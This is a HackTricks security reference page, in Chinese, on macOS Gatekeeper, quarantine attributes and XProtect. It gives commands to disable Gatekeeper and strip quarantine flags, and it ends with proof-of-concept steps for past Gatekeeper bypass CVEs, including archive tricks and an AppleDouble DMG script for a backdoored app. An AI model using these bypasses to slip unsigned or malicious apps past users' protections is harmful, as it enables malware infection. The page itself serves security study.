# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中做广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) **Discord群**](https://discord.gg/hRep4RUj7f) 或 **电报群** 或在**Twitter**上**🐦**[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* 通过向**hacktricks仓库**和**hacktricks-cloud仓库**提交PR来**分享您的黑客技巧**
*
* .

</details>

## Gatekeeper

**Gatekeeper**是为Mac操作系统开发的安全功能，旨在确保用户在其系统上**仅运行可信软件**。它通过**验证用户从**App Store**之外的来源下载并尝试打开的软件**（如应用程序、插件或安装程序包）来发挥作用。

Gatekeeper的关键机制在于其**验证**过程。它检查下载的软件是否**由已知开发人员签名**，确保软件的真实性。此外，它还确定软件是否**由Apple进行了公证**，以确认其不包含已知恶意内容，并且在公证后未被篡改。

此外，Gatekeeper通过**提示用户批准首次打开**下载软件来加强用户控制和安全性。这一保护措施有助于防止用户无意中运行可能有害的可执行代码，而他们可能误将其视为无害的数据文件。

### 应用程序签名

应用程序签名，也称为代码签名，是Apple安全基础设施的关键组成部分。它用于**验证软件作者**（开发人员）的身份，并确保代码自上次签名以来未被篡改。

其工作原理如下：

1. **签署应用程序：**当开发人员准备分发其应用程序时，他们会使用**私钥对应用程序进行签名**。此私钥与Apple向开发人员颁发的**证书相关联**，开发人员在加入Apple开发人员计划时会获得该证书。签署过程涉及创建应用程序所有部分的加密哈希，并使用开发人员的私钥对该哈希进行加密。
2. **分发应用程序：**签名的应用程序随后与开发人员的证书一起分发给用户，该证书包含相应的公钥。
3. **验证应用程序：**当用户下载并尝试运行应用程序时，他们的Mac操作系统使用开发人员证书中的公钥来解密哈希。然后，它根据应用程序的当前状态重新计算哈希，并将其与解密的哈希进行比较。如果它们匹配，则意味着**应用程序自开发人员签名以来未被修改**，系统允许应用程序运行。

应用程序签名是Apple Gatekeeper技术的重要组成部分。当用户尝试**打开从互联网下载的应用程序**时，Gatekeeper会验证应用程序签名。如果应用程序使用由苹果向已知开发人员颁发的证书签名，并且代码未被篡改，Gatekeeper允许应用程序运行。否则，它会阻止应用程序并警告用户。

从macOS Catalina开始，**Gatekeeper还会检查应用程序是否已被Apple进行了公证**，增加了额外的安全层。公证过程会检查应用程序是否存在已知的安全问题和恶意代码，如果这些检查通过，Apple会向应用程序添加Gatekeeper可以验证的凭证。

#### 检查签名

在检查一些**恶意软件样本**时，您应始终**检查二进制文件的签名**，因为签署它的**开发人员**可能已与**恶意软件**有关。
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### 验证

苹果的验证流程作为一项额外的保障，旨在保护用户免受潜在有害软件的侵害。它涉及**开发人员将其应用提交给苹果的验证服务**进行审查，这与应用审核不应混淆。这项服务是一个**自动化系统**，会审查提交的软件是否存在**恶意内容**以及代码签名是否存在任何潜在问题。

如果软件**通过**此检查而没有引起任何关注，验证服务将生成一个验证票证。然后开发人员需要**将此票证附加到其软件**上，这个过程称为“装订”。此外，验证票证也会在线发布，Gatekeeper，苹果的安全技术，可以访问它。

在用户首次安装或执行软件时，验证票证的存在 - 无论是装订到可执行文件上还是在线找到 - **通知 Gatekeeper 软件已由苹果进行验证**。因此，Gatekeeper 在初始启动对话框中显示一个描述性消息，指示该软件已经通过苹果的恶意内容检查。这个过程增强了用户对他们在系统上安装或运行的软件安全性的信心。

### 枚举 Gatekeeper

Gatekeeper 既是**几个安全组件**，用于阻止不受信任的应用程序执行，也是**其中的一个组件**。

可以使用以下命令查看 Gatekeeper 的**状态**：
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
请注意，GateKeeper 签名检查仅针对具有**Quarantine 属性**的文件执行，而不是针对每个文件执行。
{% endhint %}

GateKeeper 将检查二进制文件是否可以执行，根据**偏好设置和签名**：

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

保存此配置的数据库位于**`/var/db/SystemPolicy`**。您可以以 root 身份检查此数据库：
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
请注意第一个规则以“**App Store**”结尾，第二个规则以“**Developer ID**”结尾，并且在之前的图像中它被设置为**允许从App Store和已识别开发者执行应用程序**。\
如果您将该设置修改为App Store，则**“已经过公证的开发者ID”规则将消失**。

还有成千上万个**类型为GKE**的规则：
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
这些哈希值来自于**`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`、`/var/db/gke.bundle/Contents/Resources/gk.db`**和**`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

或者你可以列出前面提到的信息：
```bash
sudo spctl --list
```
**`spctl`** 的选项 **`--master-disable`** 和 **`--global-disable`** 将完全**禁用**这些签名检查：
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
完全启用后，将出现一个新选项：

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

可以使用以下方法**检查应用程序是否会被 GateKeeper 允许**：
```bash
spctl --assess -v /Applications/App.app
```
可以通过以下方式向 GateKeeper 添加新规则，允许执行特定的应用程序：
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### 检疫文件

在下载应用程序或文件时，特定的 macOS 应用程序，如网络浏览器或电子邮件客户端，会向下载的文件附加一个称为“**quarantine flag**”的扩展文件属性。该属性作为一项安全措施，将文件标记为来自不受信任的来源（互联网），并可能携带风险。然而，并非所有应用程序都会附加此属性，例如，常见的 BitTorrent 客户端软件通常会绕过此过程。

**当用户尝试执行文件时，quarantine flag 的存在会向 macOS 的 Gatekeeper 安全功能发出信号**。

在**quarantine flag 不存在的情况下**（例如通过某些 BitTorrent 客户端下载的文件），Gatekeeper 的**检查可能不会执行**。因此，用户在打开从较不安全或未知来源下载的文件时应谨慎。

{% hint style="info" %}
**检查**代码签名的**有效性**是一个**资源密集型**的过程，包括生成代码及其所有捆绑资源的加密**哈希**。此外，检查证书的有效性涉及向苹果的服务器进行**在线检查**，以查看证书是否在签发后被吊销。出于这些原因，每次启动应用程序时运行完整的代码签名和公证检查是**不切实际**的。

因此，这些检查**仅在执行带有隔离属性的应用程序时运行**。
{% endhint %}

{% hint style="warning" %}
此属性必须由**创建/下载文件的应用程序设置**。

但是，经过沙盒化的文件将为它们创建的每个文件设置此属性。非沙盒化的应用程序可以自行设置此属性，或在 **Info.plist** 中指定 [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) 键，系统将在创建的文件上设置 `com.apple.quarantine` 扩展属性。
{% endhint %}

可以通过以下方式**检查其状态并启用/禁用**（需要 root 权限）：
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
您还可以使用以下方法**查找文件是否具有隔离扩展属性**：
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
检查**扩展属性**的**值**，找出写入隔离属性的应用程序：
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
实际上，一个进程“可以为它创建的文件设置隔离标志”（我尝试在创建的文件中应用USER\_APPROVED标志，但它不会应用）：

<details>

<summary>源代码应用隔离标志</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

然后使用以下命令**删除**该属性：
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
并使用以下命令查找所有被隔离的文件：

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

隔离信息也存储在由LaunchServices管理的中央数据库中，位于**`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**。

#### **Quarantine.kext**

内核扩展仅通过系统上的**内核缓存**可用；但是，您可以从https://developer.apple.com/下载**Kernel Debug Kit**，其中包含扩展的符号化版本。

### XProtect

XProtect是macOS中内置的**反恶意软件**功能。XProtect会针对已知恶意软件和不安全文件类型的数据库**检查任何应用程序在首次启动或修改时**。当您通过某些应用程序（如Safari、Mail或Messages）下载文件时，XProtect会自动扫描该文件。如果文件与其数据库中的任何已知恶意软件匹配，XProtect将**阻止文件运行**并向您发出威胁警报。

XProtect数据库由Apple定期更新新的恶意软件定义，并这些更新会自动下载并安装到您的Mac上。这确保了XProtect始终与最新已知威胁保持同步。

然而，值得注意的是**XProtect并非全功能防病毒解决方案**。它仅检查特定已知威胁列表，不像大多数防病毒软件那样执行访问扫描。

您可以获取有关最新XProtect更新的信息运行：

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect位于SIP受保护位置**/Library/Apple/System/Library/CoreServices/XProtect.bundle**，在bundle内部，您可以找到XProtect使用的信息：

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**：允许具有这些cdhashes的代码使用传统授权。
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**：禁止通过BundleID和TeamID加载的插件和扩展列表，或指示最低版本。
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**：用于检测恶意软件的Yara规则。
- **`XProtect.bundle/Contents/Resources/gk.db`**：带有已阻止应用程序和TeamID哈希的SQLite3数据库。

请注意，还有另一个与XProtect相关的App位于**`/Library/Apple/System/Library/CoreServices/XProtect.app`**，与Gatekeeper进程无关。

### 非Gatekeeper

{% hint style="danger" %}
请注意，Gatekeeper**不会每次**执行应用程序时都执行，只有在您执行已由Gatekeeper执行和验证的应用程序时，_**AppleMobileFileIntegrity** (AMFI)才会**验证可执行代码签名**。
{% endhint %}

因此，以前可以执行一个应用程序以将其缓存到Gatekeeper中，然后**修改应用程序的非可执行文件**（如Electron asar或NIB文件），如果没有其他保护措施，应用程序将带有**恶意**添加项**执行**。

然而，现在这是不可能的，因为macOS**阻止修改**应用程序包内的文件。因此，如果尝试[Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md)攻击，您将发现不再可能滥用它，因为在执行应用程序以将其缓存到Gatekeeper后，您将无法修改bundle。例如，如果更改Contents目录的名称为NotCon（如在漏洞利用中指示的那样），然后执行应用程序的主要二进制文件以将其缓存到Gatekeeper，将触发错误并且不会执行。

## Gatekeeper绕过

任何绕过Gatekeeper的方法（成功让用户下载并在Gatekeeper应该禁止时执行）都被视为macOS中的漏洞。以下是一些过去允许绕过Gatekeeper的技术分配的CVE：

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

观察到，如果使用**Archive Utility**进行提取，路径超过886个字符的文件将不会收到com.apple.quarantine扩展属性。这种情况无意中允许这些文件**绕过Gatekeeper**的安全检查。

查看[**原始报告**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)获取更多信息。

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

当使用**Automator**创建应用程序时，关于其执行所需内容的信息位于`application.app/Contents/document.wflow`中，而不是在可执行文件中。可执行文件只是一个名为**Automator Application Stub**的通用Automator二进制文件。

因此，您可以使`application.app/Contents/MacOS/Automator\ Application\ Stub`**指向系统内另一个Automator Application Stub的符号链接**，它将执行`document.wflow`中的内容（您的脚本）**而不触发Gatekeeper**，因为实际可执行文件没有quarantine xattr。&#x20;

预期位置示例：`/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

查看[**原始报告**](https://ronmasas.com/posts/bypass-macos-gatekeeper)获取更多信息。

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

在此绕过中，创建了一个zip文件，从`application.app/Contents`开始压缩，而不是从`application.app`开始。因此，**quarantine attr**被应用于**来自`application.app/Contents`的所有文件**，但**未应用于`application.app`**，Gatekeeper正在检查的是这一点，因此当触发`application.app`时，**它没有quarantine属性**，从而绕过了Gatekeeper。
```bash
zip -r test.app/Contents test.zip
```
查看[**原始报告**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)以获取更多信息。

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

即使组件不同，利用此漏洞的方式与先前的漏洞非常相似。在这种情况下，我们将从**`application.app/Contents`**生成一个苹果存档，这样当通过**Archive Utility**解压缩时，**`application.app`将不会获得隔离属性**。
```bash
aa archive -d test.app/Contents -o test.app.aar
```
查看[**原始报告**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)以获取更多信息。

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** 可用于阻止任何人在文件中写入属性：
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
此外，**AppleDouble** 文件格式会复制文件及其ACEs。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中，可以看到存储在名为**`com.apple.acl.text`**的xattr中的ACL文本表示将被设置为解压后文件的ACL。因此，如果您使用**AppleDouble**文件格式将应用程序压缩到zip文件中，并附带一个ACL以阻止其他xattr写入它...则隔离xattr不会设置到应用程序中：
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。

请注意，这也可以利用AppleArchives：
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

发现**Google Chrome没有设置下载文件的隔离属性**，因为存在一些macOS内部问题。

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble文件格式将文件的属性存储在以`._`开头的单独文件中，这有助于在**macOS设备之间复制文件属性**。然而，注意到在解压缩AppleDouble文件后，以`._`开头的文件**没有被赋予隔离属性**。

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

能够创建一个不会设置隔离属性的文件，这样就有可能绕过Gatekeeper。技巧是使用AppleDouble命名约定（以`._`开头）创建一个DMG文件应用程序，并创建一个可见文件作为对这个没有隔离属性的隐藏文件的符号链接。当执行dmg文件时，由于它没有隔离属性，它将绕过Gatekeeper。
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### 防止隔离 xattr

在 ".app" bundle 中，如果没有添加隔离 xattr，当执行它时**Gatekeeper 将不会被触发**。
